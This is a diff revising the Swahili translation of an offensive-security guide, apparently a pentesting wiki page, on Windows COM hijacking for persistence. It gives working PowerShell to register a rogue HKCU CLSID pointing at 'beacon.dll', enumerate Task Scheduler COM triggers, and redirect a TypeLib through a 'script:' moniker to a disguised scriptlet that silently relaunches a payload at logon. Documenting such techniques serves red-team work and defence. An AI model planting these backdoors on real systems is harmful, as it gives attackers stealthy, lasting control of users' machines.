@@ -4,21 +4,21 @@
 
 ### Kutafuta vipengele vya COM visivyopo
 
-Kama thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **mbinu za kudumu**. Kutumia `procmon` ni rahisi kupata rejista za COM zilizoombwa ambazo hazipo na ambazo mshambuliaji anaweza kuziunda ili kudumu. Vichujio:
+Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **mbinu za kudumu**. Kwa kutumia `procmon` ni rahisi kupata rejista za COM zinazotafutwa ambazo hazipo ambazo mshambuliaji angeweza kuunda ili kudumu. Vichujio:
 
-- **RegOpenKey** operations.
+- **RegOpenKey** operesheni.
 - ambapo _Result_ ni **NAME NOT FOUND**.
-- na _Path_ inamalizika na **InprocServer32**.
+- na _Path_ inaishia na **InprocServer32**.
 
-Mara uamapoamua ni COM gani isiyokuwepo kuigiza, tekeleza amri zifuatazo. _Angalia kwa uangalifu ikiwa utaamua kuiga COM ambayo inapakiwa kila sekunde chache kwani hiyo inaweza kuwa ya kupitiliza._
+Ukishamua COM isiyokuwepo unayotaka kuiga, tekeleza amri zifuatazo. _Kuwa mwangalifu ikiwa utaamua kuiga COM inayopakiwa kila sekunde chache kwani inaweza kuwa ya ziada._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### Hijackable Task Scheduler COM components
+### Vipengele vya COM vya Task Scheduler vinavyoweza kuporwa
 
-Windows Tasks zinatumia Custom Triggers kuita COM objects, na kwa sababu zinaendeshwa kupitia Task Scheduler, ni rahisi kutabiri lini zitaanzishwa.
+Windows Tasks hutumia Custom Triggers kuwaita COM objects, na kwa sababu zinaendeshwa kupitia Task Scheduler, ni rahisi kutabiri lini zitaamshwa.
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -49,9 +49,9 @@ Write-Host
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [more like the previous one...]</code></pre>
 
-Ukikagua matokeo unaweza kuchagua moja ambayo itaendeshwa **kila wakati mtumiaji anapoingia** kwa mfano.
+Ukikagua matokeo unaweza kuchagua ile ambayo itaendeshwa **kila wakati mtumiaji anapoingia** kwa mfano.
 
-Sasa unapochunguza CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kawaida utagundua kwamba thamani haipo katika HKCU.
+Sasa ukiyatafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kawaida utagundua kuwa thamani hiyo haipo katika HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -72,32 +72,32 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Kisha, unaweza tu kuunda kiingilio cha HKCU na kila mtumiaji anapoingia, backdoor yako itaanzishwa.
+Kisha, unaweza kuunda tu entry ya HKCU na kila mara mtumiaji atakapojisajili, backdoor yako itatekelezwa.
 
 ---
 
 ## COM TypeLib Hijacking (script: moniker persistence)
 
-Type Libraries (TypeLib) zinaelezea COM interfaces na zinaingizwa kupitia `LoadTypeLib()`. Wakati COM server inapoanzishwa, OS pia inaweza kuingiza TypeLib inayohusiana kwa kushauriana na funguo za rejista chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib itabadilishwa na **moniker**, mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet wakati TypeLib inapogunduliwa — na kusababisha persistence ya kimyakimya inayochochewa wakati vipengele vya kawaida vinapoguswa.
+Type Libraries (TypeLib) hueleza interfaces za COM na zinapakiwa kupitia `LoadTypeLib()`. Wakati COM server inapojengwa, OS pia inaweza kupakia TypeLib inayohusiana kwa kuangalia vigezo vya rejista chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib itabadilishwa kuwa **moniker**, mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet wakati TypeLib itakapotatuliwa — ikitoa uendelevu wa kimfichoni unaochochewa wakati vipengele vya kawaida vinapoguswa.
 
-Hii imeonekana dhidi ya Microsoft Web Browser control (inayoingizwa mara kwa mara na Internet Explorer, programu zinazojumuisha WebBrowser, na hata `explorer.exe`).
+Hii imeonekana dhidi ya Microsoft Web Browser control (kinachopakiwa mara kwa mara na Internet Explorer, programu zinazojumuisha WebBrowser, na hata `explorer.exe`).
 
 ### Hatua (PowerShell)
 
-1) Tambua TypeLib (LIBID) inayotumiwa na CLSID inayotumika mara kwa mara. Mfano wa CLSID unaotumika mara nyingi na minyororo ya malware: {EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B} (Microsoft Web Browser).
+1) Tambua TypeLib (LIBID) inayotumika na CLSID inayotumika mara kwa mara. Mfano wa CLSID unaotumiwa mara nyingi na malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
 ```powershell
 $clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
 $libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
 $ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
 "CLSID=$clsid  LIBID=$libid  VER=$ver"
 ```
-2) Elekeza njia ya TypeLib ya mtumiaji mmoja kwa scriptlet ya ndani ukitumia moniker `script:` (no admin rights required):
+2) Elekeza per-user TypeLib path kwa scriptlet ya ndani kwa kutumia moniker ya `script:` (haitaji ruhusa za admin):
 ```powershell
 $dest = 'C:\\ProgramData\\Udate_Srv.sct'
 New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
-3) Drop JScript `.sct` ndogo kabisa inayowasha tena primary payload yako (kwa mfano `.lnk` inayotumiwa na initial chain):
+3) Weka JScript `.sct` ndogo inayoiendesha tena payload yako kuu (kwa mfano `.lnk` inayotumika katika mnyororo wa awali):
 ```xml
 <?xml version="1.0"?>
 <scriptlet>
@@ -114,7 +114,7 @@ sh.Run(cmd, 0, false);
 </script>
 </scriptlet>
 ```
-4) Kuchochea – kufungua IE, programu inayojumuisha WebBrowser control, au hata shughuli za kawaida za Explorer zitapakia TypeLib na kutekeleza scriptlet, zikirejesha mnyororo wako wakati wa logon/reboot.
+4) Kusababisha – kufungua IE, au programu inayojumuisha WebBrowser control, au hata shughuli za kawaida za Explorer zitaleta TypeLib na kutekeleza scriptlet, kuwasha tena mnyororo wako wakati wa logon/reboot.
 
 Usafishaji
 ```powershell
@@ -124,7 +124,7 @@ Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$n
 Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
 Vidokezo
-- Unaweza kutumia mantiki ile ile kwa COM components nyingine zinazotumika mara kwa mara; daima pata `LIBID` halisi kutoka `HKCR\CLSID\{CLSID}\TypeLib` kwanza.
+- Unaweza kutumia mantiki sawa kwenye komponenti nyingine za COM zinazotumika sana; daima pata `LIBID` halisi kutoka `HKCR\CLSID\{CLSID}\TypeLib` kwanza.
 - Kwenye mifumo ya 64-bit unaweza pia kujaza subkey ya `win64` kwa watumiaji wa 64-bit.
 
 ## Marejeo
